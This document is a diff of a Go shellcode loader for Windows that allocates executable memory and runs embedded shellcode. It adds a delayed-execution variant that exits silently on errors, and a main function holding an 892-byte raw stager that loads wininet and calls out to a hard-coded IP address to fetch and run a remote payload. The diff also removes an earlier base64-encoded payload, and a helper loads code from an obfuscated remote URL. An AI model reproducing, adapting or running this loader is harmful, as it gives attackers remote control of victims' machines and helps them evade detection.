@@ -7,6 +7,7 @@ import (
 	"net/http"
 	"os"
 	"syscall"
+	"time"
 	"unsafe"
 )
 
@@ -21,8 +22,8 @@ var (
 	ntdll              = syscall.MustLoadDLL("ntdll.dll")
 	VirtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
 	procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
-	// RtlCopyMemory      = ntdll.MustFindProc("RtlCopyMemory")
-	RtlMoveMemory = ntdll.MustFindProc("RtlMoveMemory")
+	RtlCopyMemory      = ntdll.MustFindProc("RtlCopyMemory")
+	RtlMoveMemory      = ntdll.MustFindProc("RtlMoveMemory")
 )
 
 func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
@@ -44,10 +45,9 @@ func checkErr(err error) {
 }
 
 func getCode(key string) []byte {
-	xor := encry.Xor{}
 	//远程加载
 	//Url0:= xor.d("daed8f25d0556d6fd037583947598324928")
-	url0 := xor.D(key)
+	url0 := encry.D(key)
 
 	var CL http.Client
 	//_ = exec.Command("calc.exe").Start()
@@ -67,11 +67,7 @@ func getCode(key string) []byte {
 	return []byte{}
 }
 
-func main() {
-
-	b64body := "DQxXHgwMVx4YzDBceDAwXHXHgzNFx4ODhceDQ4XHgwMVx4ZDZceDRkXHgzMVx4YzlceDQ4I0XHgwOFx4NDVceDM5XHhkMVx4NzVceGQ4XHg1OFx4NDRceDhiXHg0MFx4MjRceDQ5XHgwMVx4ZDBceDY2XHg0MVx4OGJceDBjXHg0OFx4NDRceDhiXHg0MFx4MWNceDQ5XHgwMVx4ZDBceDQxXHg4Ylx4MDRceDg4XHg0OFx4MDFceGQwXHg0MVx4NThceDQxXHg1OFx4NWVceDU5XHg1YVx4NDFceDU4XHg0MVx4NTlceDQxXHg1YVx4NDhceDgzXHhlY1x4MjBceDQxXHg1Mlx4ZmZceGUwXHg1OFx4NDFceDU5XHg1YVx4NDhceDhiXHgxMlx4ZTlceDRmXHhmZlx4ZmZceGZmXHg1ZFx4NmFceDAwXHg0OVx4YmVceDc3XHg2OVx4NmVceDY5XHg2ZVx4NjVceDc0XHgwMFx4NDFceDU2XHg0OVx4ODlceGU2XHg0Y1x4ODlceGYxXHg0MVx4YmFceDRjXHg3N1x4MjZceDA3XHhmZlx4ZDVceDQ4XHgzMVx4YzlceDQ4XHgzMVx4ZDJceDRkXHgzMVx4YzBceDRkXHgzMVx4YzlceDQxXHg1MFx4NDFceDUwXHg0MVx4YmFceDNhXHg1Nlx4NzlceGE3XHhmZlx4ZDVceGViXHg3M1x4NWFceDQ4XHg4OVx4YzFceDQxXHhiOFx4NTBceDAwXHgwMFx4MDBceDRkXHgzMVx4YzlceDQxXHg1MVx4NDFceDUxXHg2YVx4MDNceDQxXHg1MVx4NDFceGJhXHg1N1x4ODlceDlmXHhjNlx4ZmZceGQ1XHhlYlx4NTlceDViXHg0OFx4ODlceGMxXHg0OFx4MzFceGQyXHg0OVx4ODlceGQ4XHg0ZFx4MzFceGM5XHg1Mlx4NjhceDAwXHgwMlx4NDBceDg0XHg1Mlx4NTJceDQxXHhiYVx4ZWJceDU1XHgyZVx4M2JceGZmXHhkNVx4NDhceDg5XHhjNlx4NDhceDgzXHhjM1x4NTBceDZhXHgwYVx4NWZceDQ4XHg4OVx4ZjFceDQ4XHg4OVx4ZGFceDQ5XHhjN1x4YzBceGZmXHhmZlx4ZmZceGZmXHg0ZFx4MzFceGM5XHg1Mlx4NTJceDQxXHhiYVx4MmRceDA2XHgxOFx4N2JceGZmXHhkNVx4ODVceGMwXHgwZlx4ODVceDlkXHgwMVx4MDBceDAwXHg0OFx4ZmZceGNmXHgwZlx4ODRceDhjXHgwMVx4MDBceDAwXHhlYlx4ZDNceGU5XHhlNFx4MDFceDAwXHgwMFx4ZThceGEyXHhmZlx4ZmZceGZmXHgyZlx4NzNceDQ0XHg0ZFx4NTlceDAwXHgzNVx4NGZceDIxXHg1MFx4MjVceDQwXHg0MVx4NTBceDViXHgzNFx4NWNceDUwXHg1YVx4NThceDM1XHgzNFx4MjhceDUwXHg1ZVx4MjlceDM3XHg0M1x4NDNceDI5XHgzN1x4N2RceDI0XHg0NVx4NDlceDQzXHg0MVx4NTJceDJkXHg1M1x4NTRceDQxXHg0ZVx4NDRceDQxXHg1Mlx4NDRceDJkXHg0MVx4NGVceDU0XHg0OVx4NTZceDQ5XHg1Mlx4NTVceDUzXHgyZFx4NTRceDQ1XHg1M1x4NTRceDJkXHg0Nlx4NDlceDRjXHg0NVx4MjFceDI0XHg0OFx4MmJceDQ4XHgyYVx4MDBceDM1XHg0Zlx4MjFceDUwXHgyNVx4MDBceDU1XHg3M1x4NjVceDcyXHgyZFx4NDFceDY3XHg2NVx4NmVceDc0XHgzYVx4MjBceDRkXHg2Zlx4N2FceDY5XHg2Y1x4NmNceDYxXHgyZlx4MzVceDJlXHgzMFx4MjBceDI4XHg2M1x4NmZceDZkXHg3MFx4NjFceDc0XHg2OVx4NjJceDZjXHg2NVx4M2JceDIwXHg0ZFx4NTNceDQ5XHg0NVx4MjBceDM5XHgyZVx4MzBceDNiXHgyMFx4NTdceDY5XHg2ZVx4NjRceDZmXHg3N1x4NzNceDIwXHg0ZVx4NTRceDIwXHgzNlx4MmVceDMxXHgzYlx4MjBceDU3XHg0Zlx4NTdceDM2XHgzNFx4M2JceDIwXHg1NFx4NzJceDY5XHg2NFx4NjVceDZlXHg3NFx4MmZceDM1XHgyZVx4MzBceDNiXHgyMFx4NDJceDRmXHg0OVx4NDVceDM5XHgzYlx4NDVceDRlXHg1NVx4NTNceDI5XHgwZFx4MGFceDAwXHgzNVx4NGZceDIxXHg1MFx4MjVceDQwXHg0MVx4NTBceDViXHgzNFx4NWNceDUwXHg1YVx4NThceDM1XHgzNFx4MjhceDUwXHg1ZVx4MjlceDM3XHg0M1x4NDNceDI5XHgzN1x4N2RceDI0XHg0NVx4NDlceDQzXHg0MVx4NTJceDJkXHg1M1x4NTRceDQxXHg0ZVx4NDRceDQxXHg1Mlx4NDRceDJkXHg0MVx4NGVceDU0XHg0OVx4NTZceDQ5XHg1Mlx4NTVceDUzXHgyZFx4NTRceDQ1XHg1M1x4NTRceDJkXHg0Nlx4NDlceDRjXHg0NVx4MjFceDI0XHg0OFx4MmJceDQ4XHgyYVx4MDBceDM1XHg0Zlx4MjFceDUwXHgyNVx4NDBceDQxXHg1MFx4NWJceDM0XHg1Y1x4NTBceDVhXHg1OFx4MzVceDM0XHgyOFx4NTBceDVlXHgyOVx4MzdceDQzXHg0M1x4MjlceDM3XHg3ZFx4MjRceDQ1XHg0OVx4NDNceDQxXHg1Mlx4MmRceDUzXHg1NFx4NDFceDRlXHg0NFx4NDFceDUyXHg0NFx4MmRceDQxXHg0ZVx4NTRceDQ5XHg1Nlx4NDlceDUyXHg1NVx4NTNceDJkXHg1NFx4NDVceDUzXHg1NFx4MmRceDQ2XHg0OVx4NGNceDQ1XHgyMVx4MjRceDQ4XHgyYlx4NDhceDJhXHgwMFx4MzVceDRmXHgyMVx4NTBceDI1XHg0MFx4NDFceDUwXHg1Ylx4MzRceDVjXHg1MFx4NWFceDU4XHgzNVx4MzRceDI4XHg1MFx4NWVceDI5XHgzN1x4NDNceDQzXHgyOVx4MzdceDdkXHgyNFx4NDVceDQ5XHg0M1x4NDFceDUyXHgyZFx4NTNceDU0XHg0MVx4NGVceDQ0XHg0MVx4NTJceDQ0XHgyZFx4NDFceDRlXHg1NFx4NDlceDU2XHg0OVx4NTJceDU1XHg1M1x4MmRceDU0XHg0NVx4NTNceDU0XHgyZFx4NDZceDQ5XHg0Y1x4NDVceDIxXHgyNFx4NDhceDJiXHg0OFx4MmFceDAwXHgzNVx4NGZceDAwXHg0MVx4YmVceGYwXHhiNVx4YTJceDU2XHhmZlx4ZDVceDQ4XHgzMVx4YzlceGJhXHgwMFx4MDBceDQwXHgwMFx4NDFceGI4XHgwMFx4MTBceDAwXHgwMFx4NDFceGI5XHg0MFx4MDBceDAwXHgwMFx4NDFceGJhXHg1OFx4YTRceDUzXHhlNVx4ZmZceGQ1XHg0OFx4OTNceDUzXHg1M1x4NDhceDg5XHhlN1x4NDhceDg5XHhmMVx4NDhceDg5XHhkYVx4NDFceGI4XHgwMFx4MjBceDAwXHgwMFx4NDlceDg5XHhmOVx4NDFceGJhXHgxMlx4OTZceDg5XHhlMlx4ZmZceGQ1XHg0OFx4ODNceGM0XHgyMFx4ODVceGMwXHg3NFx4YjZceDY2XHg4Ylx4MDdceDQ4XHgwMVx4YzNceDg1XHhjMFx4NzVceGQ3XHg1OFx4NThceDU4XHg0OFx4MDVceDAwXHgwMFx4MDBceDAwXHg1MFx4YzNceGU4XHg5Zlx4ZmRceGZmXHhmZlx4MzFceDM5XHgzMlx4MmVceDMxXHgzNlx4MzhceDJlXHgzMlx4MzJceDM4XHgyZVx4MzFceDMyXHgzOVx4MDBceDAwXHgwMFx4MDBceDAw"
-	shellCodeHex := encry.GetShellCode(b64body)
-	var charcode = shellCodeHex
+func genEXE(charcode []byte) {
 
 	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 	if addr == 0 {
@@ -85,4 +81,28 @@ func main() {
 	}
 
 	syscall.Syscall(addr, 0, 0, 0, 0)
+}
+
+func genEXE1(shellcode []byte) {
+	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+	if err != nil && err.Error() != "The operation completed successfully." {
+		syscall.Exit(0)
+	}
+	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	if err != nil && err.Error() != "The operation completed successfully." {
+		syscall.Exit(0)
+	}
+	time.Sleep(5 * time.Second)
+	syscall.Syscall(addr, 0, 0, 0, 0)
+}
+
+func main() {
+	/* length: 892 bytes */
+	data := "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x20\x03\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4b\x63\x37\x78\x00\x71\xdc\x5f\x88\xf7\x61\x31\x6d\x97\xc1\xb8\x8a\xb1\x4b\x19\x71\x98\x27\x97\xe9\xc8\x22\xcc\x77\xe1\x0d\x75\xe2\x18\x7a\x58\x6c\x7a\x9c\xba\x43\x64\x39\xe0\x27\x59\x99\xae\xad\x5e\x4a\xa6\x5e\xe4\xbd\x85\x6b\x28\xa7\x42\x11\xaf\x9e\x4e\xcc\x65\xd5\x5f\x0f\x4c\x76\x14\xbb\xd5\x55\x28\xba\x02\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x32\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x36\x2e\x30\x29\x0d\x0a\x00\x2d\xbe\xea\x9c\x8c\xd1\x2e\x37\xfe\x2f\x6f\xa6\x0d\x4d\x3a\x60\x02\x25\xe2\xd5\xbe\x91\x5f\xf1\xb0\x59\x90\xfd\x7a\x2c\x45\x17\xe4\xb7\x28\x47\x39\x9c\x92\x59\x8b\x8e\xa4\x62\x74\x6c\x45\x06\x91\xce\x72\xcc\xea\x46\xd8\x6a\x65\xd9\xf5\x3b\x07\x85\xbe\x1c\x03\x1e\x4c\x44\xe9\x3c\xbb\x81\xc1\xbe\xa2\x26\x02\x98\x71\xab\xa1\xa5\xc2\xd0\x95\xa1\xb7\xe2\x39\x67\x7f\x98\x78\x41\xcc\xfd\xb5\x3d\x86\x31\x57\x0e\xc7\x09\xb9\xf7\x23\x19\x8d\xa1\x07\x22\xb9\xd0\x53\xe9\x89\x93\x69\xe6\x48\x6f\xb8\x3e\xa1\x38\x54\x1c\xdd\x61\x48\x44\xec\x20\xbc\xfd\x9a\x8e\x2e\xa6\xf0\x90\x0b\x7c\x9a\x32\x67\x22\x7a\xb3\x11\xb4\x82\xd6\x92\xd7\xde\x1e\x5e\x44\x59\x73\x8c\x55\xc8\xf6\x9c\x93\xb8\xe7\x8a\x69\x54\x9c\xca\xdb\xd1\x7b\x61\x54\xfa\xe7\x0f\x87\x44\x0a\x67\x37\x23\xfc\x9c\xbf\xe5\xcd\xd9\xb2\x43\x6e\xea\x99\x47\x6b\x77\x44\x91\x01\x67\x7e\x64\x12\x78\xea\xa3\x4e\x9b\x01\x2f\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x32\x32\x2e\x39\x2e\x31\x35\x37\x2e\x31\x32\x32\x00\x12\x34\x56\x78"
+
+	shellCodeHex := encry.GetShellCode(encry.GetBase64Data([]byte(data)))
+	genEXE(shellCodeHex)
+
+	//fmt.Print(encry.EE("ba`gfe"))
+
 }
